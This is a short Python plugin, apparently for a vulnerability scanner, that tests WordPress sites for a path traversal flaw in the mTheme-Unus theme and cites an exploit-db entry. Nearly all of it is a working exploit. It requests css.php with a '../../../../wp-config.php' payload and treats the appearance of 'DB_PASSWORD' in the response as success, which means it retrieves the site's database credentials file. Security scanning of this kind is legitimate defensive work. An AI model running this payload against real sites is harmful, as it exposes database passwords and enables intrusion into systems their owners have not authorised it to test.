# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#__Author__ = DWBH
# __refer__  = https://www.exploit-db.com/exploits/37244/

def assign(service, arg):
    if service == "wordpress":  
        return True, arg
    
def audit(arg):
    payload='wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
    target=arg+payload
    code, head, res, ecode, redirect_url =curl.curl(target)
    if code == 200 and 'DB_PASSWORD' in res:
       security_hole(target)
       
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://localhost/wordpress/')[1])
